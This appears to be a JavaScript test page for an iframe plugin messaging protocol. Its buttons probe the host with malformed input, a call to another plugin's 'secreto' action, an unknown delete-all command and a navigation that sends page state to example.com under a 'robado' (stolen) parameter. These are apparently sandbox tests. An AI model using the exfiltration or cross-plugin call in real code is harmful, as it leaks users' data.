// Interfaz de prueba (PLAN_PAQUETES §5): usa el protocolo v1 entero, para probarlo en el
// navegador (§10 «Protocolo de interfaz»). Cada botón es un caso; lo que vuelve sale en #log.
const V = 1;
const $ = (id) => document.getElementById(id);
const out = (t) => { $("log").textContent = t; };
const tell = (msg) => parent.postMessage({ v: V, ...msg }, "*");
let n = 0;
const pending = new Map();
const ask = (msg) => new Promise((ok) => { const id = ++n; pending.set(id, ok); tell({ ...msg, id }); });

let theme = null;
function apply(s) {
  if (!theme) { theme = document.createElement("style"); document.head.append(theme); }
  theme.textContent = s.theme.css;
  $("estado").textContent = `${s.surface} · ${s.block.title} · a = ${s.params.a} mm · ${s.status}` +
    (s.outputs?.out?.doble ? ` · doble = ${s.outputs.out.doble.value}` : "");
  if (document.activeElement !== $("a")) $("a").value = s.params.a;
  $("botones").hidden = false;
  $("panel").hidden = s.surface === "panel";
  tell({ type: "resize", height: document.documentElement.scrollHeight });
}

window.addEventListener("message", (ev) => {
  if (ev.source !== parent) return;
  const m = ev.data;
  if (!m || m.v !== V) return;
  if (m.type === "init" || m.type === "update") apply(m);
  else if (m.type === "reply" && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); }
});

$("guardar").onclick = () => tell({ type: "setParams", params: { a: Number($("a").value) } });
$("malo").onclick = () => tell({ type: "setParams", params: { a: "no es un número" } });
$("eco").onclick = async () => out(JSON.stringify(await ask({ type: "action", name: "ui_prueba.eco", args: { hola: 1 } })));
$("ajena").onclick = async () => out(JSON.stringify(await ask({ type: "action", name: "ui_otro.secreto" })));
$("raro").onclick = () => { tell({ type: "borrarTodo" }); out("mandado borrarTodo"); };
$("ejecutar").onclick = () => tell({ type: "run" });
$("panel").onclick = () => tell({ type: "openPanel" });
$("aviso").onclick = () => tell({ type: "toast", text: "hola desde la interfaz" });
$("fuera").onclick = () => { location.href = "https://example.com/?robado=" + encodeURIComponent($("estado").textContent); };
$("recargar").onclick = () => location.reload();
tell({ type: "ready" });
